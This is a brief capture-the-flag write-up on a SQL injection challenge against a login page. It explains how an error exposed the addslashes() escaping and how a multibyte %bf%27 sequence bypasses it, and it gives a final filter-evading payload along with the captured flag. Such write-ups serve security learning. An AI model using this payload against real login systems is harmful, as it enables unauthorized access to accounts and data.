
# sadsql medium challenge
## there was just login page 
## made an error with `email[]=` revealing that the code is using for escaping addslashes() 
## addslashes() bypass with `%bf%27` ti insert single quote without escaping you can search for `addslashes() bypass` for more info  
## then `spaces` and `or` and `=` are filtered so i replaced them 
## final payload 
```
%bf%27/**/RLIKE/**/0#
```

## the flag
```
ASCWG{SqL_1Nj3ct1on_1s_V3Ry_Esay_ANd_Funyyyyyy!}
```
